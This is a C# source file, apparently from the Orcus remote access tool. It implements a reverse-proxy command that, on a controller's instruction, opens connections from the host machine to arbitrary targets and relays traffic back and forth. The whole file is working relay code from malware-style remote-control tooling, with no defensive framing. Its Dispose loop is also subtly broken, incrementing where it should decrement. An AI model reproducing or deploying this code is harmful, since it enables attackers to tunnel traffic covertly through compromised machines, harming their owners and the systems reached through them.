using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Commands.ReverseProxy.Args;
using Orcus.Plugins;
using Orcus.Shared.Commands.ReverseProxy;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ReverseProxy
{
    [DisallowMultipleThreads]
    public class ReverseProxyCommand : Command
    {
        private List<ReverseProxyClient> _proxyClients;
        private IConnectionInfo _connection;
        private bool _isDisposed;

        public override void Dispose()
        {
            base.Dispose();
            _isDisposed = true;

            if(_proxyClients != null)
                for (int i = _proxyClients.Count - 1; i >= 0; i++)
                    _proxyClients[i].Disconnect();
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            _connection = connectionInfo;

            switch ((ReverseProxyCommunication) parameter[0])
            {
                case ReverseProxyCommunication.Connect:
                    if (_proxyClients == null)
                        _proxyClients = new List<ReverseProxyClient>();

                    var connectData = Serializer.FastDeserialize<ReverseProxyConnect>(parameter, 1);
                    var reverseProxyClient = new ReverseProxyClient(connectData.Target, connectData.Port,
                        connectData.ConnectionId);
                    reverseProxyClient.DataReceived += ReverseProxyClientOnDataReceived;
                    reverseProxyClient.Disconnected += ReverseProxyClientOnDisconnected;
                    reverseProxyClient.ResponseStatusUpdate += ReverseProxyClientOnResponseStatusUpdate;

                    reverseProxyClient.Initialize();
                    _proxyClients.Add(reverseProxyClient);
                    break;
                case ReverseProxyCommunication.SendData:
                    var connectionId = BitConverter.ToInt32(parameter, 1);
                    reverseProxyClient = _proxyClients.FirstOrDefault(x => x.ConnectionId == connectionId);
                    reverseProxyClient?.SendToTargetServer(parameter, 5, parameter.Length - 5);
                    break;
                case ReverseProxyCommunication.Disconnect:
                    connectionId = BitConverter.ToInt32(parameter, 1);
                    reverseProxyClient = _proxyClients.FirstOrDefault(x => x.ConnectionId == connectionId);
                    reverseProxyClient?.Disconnect();
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void ReverseProxyClientOnResponseStatusUpdate(object sender, ReverseProxyStatusUpdatedEventArgs reverseProxyStatusUpdatedEventArgs)
        {
            if (!_isDisposed)
                ResponseBytes((byte) ReverseProxyCommunication.ResponseStatusUpdate,
                    Serializer.FastSerialize(reverseProxyStatusUpdatedEventArgs.ToStatusUpdate()), _connection);
        }

        private void ReverseProxyClientOnDisconnected(object sender, ReverseProxyEventArgs reverseProxyEventArgs)
        {
            if (_isDisposed)
                return;

            ResponseBytes((byte) ReverseProxyCommunication.ResponseDisconnected,
                BitConverter.GetBytes(reverseProxyEventArgs.ConnectionId), _connection);
            _proxyClients.Remove((ReverseProxyClient) sender);
        }

        private void ReverseProxyClientOnDataReceived(object sender, ReverseProxyDataReceivedEventArgs reverseProxyDataReceivedEventArgs)
        {
            if (_isDisposed)
                return;

            var packet = new byte[1 + 4 + reverseProxyDataReceivedEventArgs.Data.Length];
            packet[0] = (byte) ReverseProxyCommunication.ResponseData;
            Buffer.BlockCopy(BitConverter.GetBytes(reverseProxyDataReceivedEventArgs.ConnectionId), 0, packet, 1, 4);
            Buffer.BlockCopy(reverseProxyDataReceivedEventArgs.Data, 0, packet, 5,
                reverseProxyDataReceivedEventArgs.Data.Length);

            _connection.CommandResponse(this, packet);
        }

        protected override uint GetId()
        {
            return 15;
        }
    }
}